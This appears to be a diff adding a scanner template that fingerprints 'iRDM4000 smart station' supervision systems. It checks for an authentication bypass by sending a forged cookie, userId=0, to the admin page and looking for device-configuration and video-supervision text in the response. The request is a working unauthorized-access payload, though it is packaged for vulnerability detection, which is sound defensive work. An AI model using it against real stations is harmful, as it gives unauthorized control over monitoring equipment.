@@ -1,0 +1,17 @@
+name: IRDM4000 Smart station Unauthorized access
+manual: true
+query: body="iRDM4000智慧站房在线监管"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /zfjg/index.html
+      headers:
+        Cookie: userId=0
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"设备配置") && response.body.bcontains(b"视频监管")
+expression: r0()
+detail:
+  description: IRDM4000 Smart station
+  tags: unauthorized access
